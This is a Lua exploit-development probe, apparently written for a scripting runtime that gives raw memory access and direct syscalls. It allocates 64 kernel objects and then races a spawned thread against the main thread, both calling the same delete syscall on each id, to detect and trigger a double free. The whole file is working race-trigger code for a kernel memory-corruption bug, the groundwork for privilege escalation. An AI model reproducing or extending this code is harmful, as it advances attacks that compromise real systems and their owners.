-- CRASH_CLASS: RISKY
-- PROBE 497e: both callers walk the same list of 64 deletable ids
-- 497b/497c showed long-lived thread work dies around ten seconds regardless of
-- whether anything is deleted, so the race has to be short and dense. Sixty-four
-- ids, one spawn, ten passes each: the parent and the thread both delete the same
-- objects over and over. An object can be freed exactly once, so any id that
-- reports status 0 twice, counting both callers, is a double free.
print("=== PROBE 497e: two callers walk one id list ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function addrnum(v)
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return to_num(v)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local N, PASSES = 64, 10
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(N * 4)
local res1 = memory.alloc(PASSES * N * 4)
local res2 = memory.alloc(PASSES * N * 4)
local gate = memory.alloc(0x100)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local made = 0
for i = 0, N - 1 do
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if ok and id > 0 then
    pcall(function() memory.write_dword(ids + i * 4, id) end)
    pcall(function() return sc664(uint64(ids + i * 4), uint64(1), uint64(res2)) end)
    made = made + 1
  end
end
print(string.format("prepared %d objects", made))
if made == 0 then print("no ids; stopping") ; return end
for off = 0, PASSES * N * 4 - 1, 4 do
  pcall(function() memory.write_dword(res1 + off, 0x77777777) end)
  pcall(function() memory.write_dword(res2 + off, 0x77777777) end)
end
pcall(function() memory.write_dword(gate, 0) end)
pcall(function() memory.write_dword(gate + 4, 0) end)
pcall(function() memory.write_dword(gate + 8, 0) end)
local body = "local t = {}\n" ..
  "for k,v in pairs(syscall.pipe) do t[k] = v end\n" ..
  "t.syscall_no = 662\n" ..
  "setmetatable(t, getmetatable(syscall.pipe))\n" ..
  "while memory.read_dword(GATE) == 0 do end\n" ..
  "memory.write_dword(GATE + 4, 1)\n" ..
  "for p = 0, PASSES - 1 do pcall(function() t(IDS, N, RES2 + p * N * 4) end) end\n" ..
  "memory.write_dword(GATE + 8, 1)\n"
body = body:gsub("GATE", tostring(addrnum(gate)))
body = body:gsub("IDS", tostring(addrnum(ids)))
body = body:gsub("RES2", tostring(addrnum(res2)))
body = body:gsub("PASSES", tostring(PASSES))
body = body:gsub("N", tostring(N))
print("spawning")
local ok, thr = pcall(run_lua_code_in_new_thread, body, { async = true })
if not ok or type(thr) ~= "table" then print("spawn failed"); return end
local spins = 0
while to_num(memory.read_dword(gate + 4)) == 0 and spins < 4000000 do spins = spins + 1 end
print("gate open")
pcall(function() memory.write_dword(gate, 1) end)
for p = 0, PASSES - 1 do
  pcall(function() return sc662(uint64(ids), uint64(N), uint64(res1 + p * N * 4)) end)
end
local jspins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and jspins < 4000000 do jspins = jspins + 1 end
pcall(function() return thr:join() end)
print("joined")
local zeros, multi, total0 = {}, 0, 0
for i = 0, N - 1 do
  local c = 0
  for p = 0, PASSES - 1 do
    if to_num(memory.read_dword(res1 + (p * N + i) * 4)) == 0 then c = c + 1 end
    if to_num(memory.read_dword(res2 + (p * N + i) * 4)) == 0 then c = c + 1 end
  end
  zeros[i] = c
  total0 = total0 + c
  if c > 1 then multi = multi + 1 end
end
local line = ""
for i = 0, N - 1 do line = line .. tostring(zeros[i]) end
print("zeros per id: " .. line)
print(string.format("objects=%d clean-deletes=%d ids-with-two=%d", made, total0, multi))
print("=== PROBE 497e COMPLETE ===")
